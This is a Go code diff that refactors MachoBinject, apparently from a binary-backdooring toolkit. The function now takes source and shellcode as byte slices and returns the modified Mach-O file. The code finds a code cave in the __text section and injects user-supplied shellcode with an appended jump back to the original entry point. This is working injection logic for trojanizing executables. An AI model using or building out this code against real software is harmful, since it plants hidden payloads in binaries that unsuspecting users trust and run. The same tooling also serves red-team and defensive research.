@@ -1,7 +1,7 @@
 package bj
 
 import (
-	"io/ioutil"
+	"bytes"
 	"log"
 
 	"github.com/Binject/debug/macho"
@@ -9,19 +9,14 @@ import (
 )
 
 // MachoBinject - Inject shellcode into an Mach-O binary
-func MachoBinject(sourceFile string, destFile string, shellcodeFile string, config *BinjectConfig) error {
-
-	userShellCode, err := ioutil.ReadFile(shellcodeFile)
-	if err != nil {
-		return err
-	}
+func MachoBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {
 
 	//
 	// BEGIN CODE CAVE DETECTION SECTION
 	//
-	machoFile, err := macho.Open(sourceFile)
+	machoFile, err := macho.NewFile(bytes.NewReader(sourceBytes))
 	if err != nil {
-		return err
+		return nil, err
 	}
 	for _, section := range machoFile.Sections {
 		if section.SectionHeader.Seg == "__TEXT" && section.Name == "__text" {
@@ -31,11 +26,16 @@ func MachoBinject(sourceFile string, destFile string, shellcodeFile string, conf
 			// END CODE CAVE DETECTION SECTION
 			//
 
-			shellcode := api.ApplySuffixJmpIntel64(userShellCode, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
+			shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
 			machoFile.Insertion = shellcode
 			break
 		}
 	}
 
-	return nil
+	machoData, err := machoFile.Bytes()
+	if err != nil {
+		return nil, err
+	}
+
+	return machoData, nil
 }
